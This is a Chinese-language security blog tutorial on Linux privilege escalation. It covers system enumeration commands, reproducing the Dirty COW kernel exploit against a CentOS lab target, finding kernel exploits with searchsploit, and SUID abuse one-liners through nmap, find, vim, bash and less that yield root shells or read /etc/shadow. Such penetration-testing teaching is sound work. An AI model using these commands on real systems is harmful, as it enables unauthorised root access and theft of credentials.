<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Linux提权（一） | WLSMILE Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Linux提权（一）</h1><a id="logo" href="/.">WLSMILE Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Linux提权（一）</h1><div class="post-meta">Oct 9, 2019<span> | </span><span class="category"><a href="/categories/Linux/">Linux</a></span></div><div class="post-content"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="内核，操作系统和设备信息"><a href="#内核，操作系统和设备信息" class="headerlink" title="内核，操作系统和设备信息"></a>内核，操作系统和设备信息</h2><pre><code>uname -a    打印所有可用的系统信息
uname -r    内核版本
uname -n    系统主机名
uname -m    查看系统内核架构（64位/32位）
hostname    系统主机名
cat /proc/version    内核信息
cat /etc/*-release   分发信息
cat /etc/issue       分发信息
cat /proc/cpuinfo    CPU信息
</code></pre><h2 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h2><pre><code>cat /etc/passwd     列出系统上的所有用户
cat /etc/group      列出系统上的所有组
grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;
                    列出所有的超级用户账户
whoami              查看当前用户
w                   谁目前已登录，他们正在做什么
last                最后登录用户的列表
lastlog             所有用户上次登录的信息
lastlog –u %username%  有关指定用户上次登录的信息
lastlog |grep -v &quot;Never&quot;  以前登录用户的完整列表
</code></pre><h2 id="用户和权限信息："><a href="#用户和权限信息：" class="headerlink" title="用户和权限信息："></a>用户和权限信息：</h2><pre><code>whoami        当前用户名
id            当前用户信息
cat /etc/sudoers  谁被允许以root身份执行
sudo -l       当前用户可以以root身份执行操作
</code></pre><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><pre><code>env        显示环境变量
set        现实环境变量
echo %PATH 路径信息
history    显示当前用户的历史命令记录
pwd        输出工作目录
cat /etc/profile   显示默认系统变量
cat /etc/shells    显示可用的shell
</code></pre><p>更多参考 -&gt; <a href="https://www.rebootuser.com/?p=1623" target="_blank" rel="noopener">https://www.rebootuser.com/?p=1623</a></p>
<h1 id="内核漏洞exp提权"><a href="#内核漏洞exp提权" class="headerlink" title="内核漏洞exp提权"></a>内核漏洞exp提权</h1><h2 id="脏牛漏洞本地提权"><a href="#脏牛漏洞本地提权" class="headerlink" title="脏牛漏洞本地提权"></a>脏牛漏洞本地提权</h2><p><strong>漏洞描述：</strong><br>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权<br>影响范围：Linux kernel &gt;=2.6.22  并且Android也受影响</p>
<p><strong>脏牛漏洞名称的来源：</strong></p>
<blockquote>
<p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。<br>一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞</p>
</blockquote>
<p><strong>漏洞原理:</strong></p>
<blockquote>
<p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。</p>
</blockquote>
<p><strong>漏洞复现过程：</strong><br>靶机：CentOS 6.5<br>1.查看linux内核版本是否大于等于2.6.22<br><code>uname -a</code><br>2.上传POC至 /tmp 目录下（tmp目录具有较高权限）<br><img src="/images/4/1.png" alt><br>3.对dirty.c进行gcc编译生成一个可执行文件</p>
<pre><code>gcc -pthread dirty.c -o dirty -lcrypt
 ***       
 -pthread会附加一个宏定义-D_REENTRANT该宏会导致libc头文件选择那些thread-safe的实现
 -o  为编译后输出的文件名
 ***
</code></pre><p><img src="/images/4/2.png" alt></p>
<p>4.运行dirty可执行文件进行本地提权<br><code>./dirty passwd</code><br>这个漏洞的执行时间将近三分钟，耐心等待之后即可出现<br><img src="/images/4/3.png" alt></p>
<p>此时切换到firefart用户，密码为123456<br><img src="/images/4/4.png" alt><br>执行 id 命令后可以看到已经时root用户了，成功提权。</p>
<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>如果linux内核版本小于2.6.22或者脏牛无法成功时，我们需要查看其他版本的内核漏洞。这时我们就用到了kali linux，自身所拥有的searchspolit可以帮助我们查看各种linux发行版本的漏洞。而searchs<br>polit的使用也很简单，只需要在后面跟上限定条件即可。<br>查看linux 的漏洞<br><code>searchspolit linux</code><br><img src="/images/4/5.png" alt><br>查看centos6的漏洞<br><code>searchspolit centos 6</code><br><img src="/images/4/6.png" alt><br>通常所用的是查看指定内核版本和linux的发行版本。如：<br><code>searchspolit centos 7 kernel 3.10</code><br><img src="/images/4/7.png" alt><br>所限定的条件越多，当然可利用的漏洞也就越少。我们选中其中符合靶机环境的漏洞后进行查看。<br>利用leafpad命令查看文档内容并且复制到靶机上生成相应的文件。（漏洞的利用虽然是英文，但是一定要看一下使用方法）<br><code>leafpad /usr/share/exploitdb/exploits/linux/dos/41350.c</code><br><img src="/images/4/8.png" alt><br>更多关于searchspolit可以浏览   –&gt; <a href="https://xz.aliyun.com/t/2860" target="_blank" rel="noopener">https://xz.aliyun.com/t/2860</a></p>
<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>suid含义：</p>
<blockquote>
<p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性</p>
</blockquote>
<p>suid提权：</p>
<blockquote>
<p>那么什么是suid提权呢？我理解的就是有个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，不然没什么用处，那么我们就能从普通用户提升到了root权限了。</p>
</blockquote>
<p>首先在本地查找符合条件的文件</p>
<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
</code></pre><p><img src="/images/4/9.png" alt><br>所列出来的文件都是以root用户权限来执行的，接下来找到可以提权的文件。</p>
<p>常见的可用于suid提权的命令</p>
<pre><code>Nmap
Vim
find
Bash
More
Less
Nano
cp
</code></pre><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。由于Nmap位于上面使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。）<br>可以使用下命令进入namp交互模式<br><code>nmap --interactive</code></p>
<p>执行命令之后会返回一个shell</p>
<pre><code>namp&gt; !sh
sh-3.2# whoami
root
</code></pre><p><img src="/images/4/10.png" alt><br>在Metasploit中也有一个模块可以通过SUID Namp进行提权<br><code>exploit/unix/local/setuid_nmap</code></p>
<h2 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h2><p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p>
<pre><code>touch test
find test -exec whoami \;
</code></pre><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。<br><code>vim /etc/shadow</code></p>
<p><img src="/images/4/11.png" alt></p>
<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>以下命令将以root身份打开一个bash shell。</p>
<pre><code>bash -p
bash-3.2# id
</code></pre><h2 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h2><p>程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令</p>
<pre><code>less /etc/passwd
!/bin/sh
</code></pre></div><div class="tags"><a href="/tags/提权/">提权</a><a href="/tags/Linux/">Linux</a></div><div class="post-nav"><a class="pre" href="/2019/10/09/5/">Linux提权（二）</a><a class="next" href="/2019/10/08/2/">phpstudy远程代码执行复现</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://luckdogiii.github.io"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/其他/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/sqlmap/" style="font-size: 15px;">sqlmap</a> <a href="/tags/漏洞复现/" style="font-size: 15px;">漏洞复现</a> <a href="/tags/提权/" style="font-size: 15px;">提权</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/注入/" style="font-size: 15px;">注入</a> <a href="/tags/sql-server/" style="font-size: 15px;">sql server</a> <a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a> <a href="/tags/端口信息/" style="font-size: 15px;">端口信息</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/06/11/">端口信息及漏洞利用总结（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/15/10/">致远 OA A8远程Getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/15/9/">泛微OA远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/14/8/">SQL SERVER 注入（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/7/">SQL SERVER 注入（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/6/">SQL SERVER 注入（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/5/">Linux提权（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/4/">Linux提权（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/08/2/">phpstudy远程代码执行复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/08/1/">SQLMAP使用总结</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="http://www.example1.com/" title="wlsmile" target="_blank">wlsmile</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">WLSMILE Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>